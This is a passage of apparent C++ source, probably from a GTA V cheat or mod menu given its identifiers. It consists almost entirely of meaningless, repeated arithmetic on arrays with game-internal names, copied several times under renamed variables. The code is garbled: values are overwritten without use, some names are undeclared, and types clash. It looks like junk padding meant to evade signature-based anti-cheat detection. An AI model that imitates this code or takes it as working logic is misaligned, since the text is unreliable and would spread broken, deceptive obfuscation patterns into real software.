						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					a = 0.0f;
					b = 0.0f;
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (5) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					a = 0.0f;
					b = 0.0f;
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					std::string a = Extern_Reader::StringManager::ReplaceWord(token, "<Y>", "");
						a = Extern_Reader::StringManager::ReplaceWord(a, "</Y>", "");
						std::string b = a;
						b = Extern_Reader::StringManager::ReplaceWord(b, "<Y>", "");

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
